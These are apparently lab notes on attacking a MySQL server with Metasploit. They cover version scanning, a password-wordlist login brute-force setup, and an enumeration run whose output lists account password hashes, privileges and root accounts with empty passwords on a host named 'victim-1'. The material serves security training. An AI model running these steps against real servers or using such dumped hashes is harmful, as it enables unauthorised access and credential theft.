# MySQL enumeration

```
search type:auxiliary name:mysql

use auxiliary/scanner/mysql/mysql_version

msf5 auxiliary(scanner/mysql/mysql_version) > run

[+] 192.51.166.3:3306     - 192.51.166.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] 192.51.166.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
use auxiliary/scanner/mysql/mysql_login

set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

```
use auxiliary/admin/mysql/mysql_enum

[*] Running module against 192.51.166.3

[*] 192.51.166.3:3306 - Running MySQL Enumerator...
[*] 192.51.166.3:3306 - Enumerating Parameters
[*] 192.51.166.3:3306 -         MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.51.166.3:3306 -         Compiled for the following OS: debian-linux-gnu
[*] 192.51.166.3:3306 -         Architecture: x86_64
[*] 192.51.166.3:3306 -         Server Hostname: victim-1
[*] 192.51.166.3:3306 -         Data Directory: /var/lib/mysql/
[*] 192.51.166.3:3306 -         Logging of queries and logins: OFF
[*] 192.51.166.3:3306 -         Old Password Hashing Algorithm OFF
[*] 192.51.166.3:3306 -         Loading of local files: ON
[*] 192.51.166.3:3306 -         Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.51.166.3:3306 -         Allow Use of symlinks for Database Files: YES
[*] 192.51.166.3:3306 -         Allow Table Merge: 
[*] 192.51.166.3:3306 -         SSL Connection: DISABLED
[*] 192.51.166.3:3306 - Enumerating Accounts:
[*] 192.51.166.3:3306 -         List of Accounts with Password Hashes:
[+] 192.51.166.3:3306 -                 User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f Password Hash: 
[+] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1 Password Hash: 
[+] 192.51.166.3:3306 -                 User: root Host: ::1 Password Hash: 
[+] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.51.166.3:3306 -                 User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.51.166.3:3306 -                 User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.51.166.3:3306 -                 User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.51.166.3:3306 -                 User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.51.166.3:3306 -                 User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.51.166.3:3306 -                 User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.51.166.3:3306 -                 User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.51.166.3:3306 -         The following users have GRANT Privilege:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -         The following users have CREATE USER Privilege:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -         The following users have RELOAD Privilege:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -         The following users have SHUTDOWN Privilege:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -         The following users have SUPER Privilege:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -         The following users have FILE Privilege:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -                 User: filetest Host: %
[*] 192.51.166.3:3306 -         The following users have PROCESS Privilege:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -         The following accounts have privileges to the mysql database:
[*] 192.51.166.3:3306 -                 User: root Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -                 User: debian-sys-maint Host: localhost
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] 192.51.166.3:3306 -         The following accounts have empty passwords:
[*] 192.51.166.3:3306 -                 User: root Host: 891b50fafb0f
[*] 192.51.166.3:3306 -                 User: root Host: 127.0.0.1
[*] 192.51.166.3:3306 -                 User: root Host: ::1
[*] 192.51.166.3:3306 -         The following accounts are not restricted by source:
[*] 192.51.166.3:3306 -                 User: filetest Host: %
[*] 192.51.166.3:3306 -                 User: root Host: %
[*] Auxiliary module execution completed
```
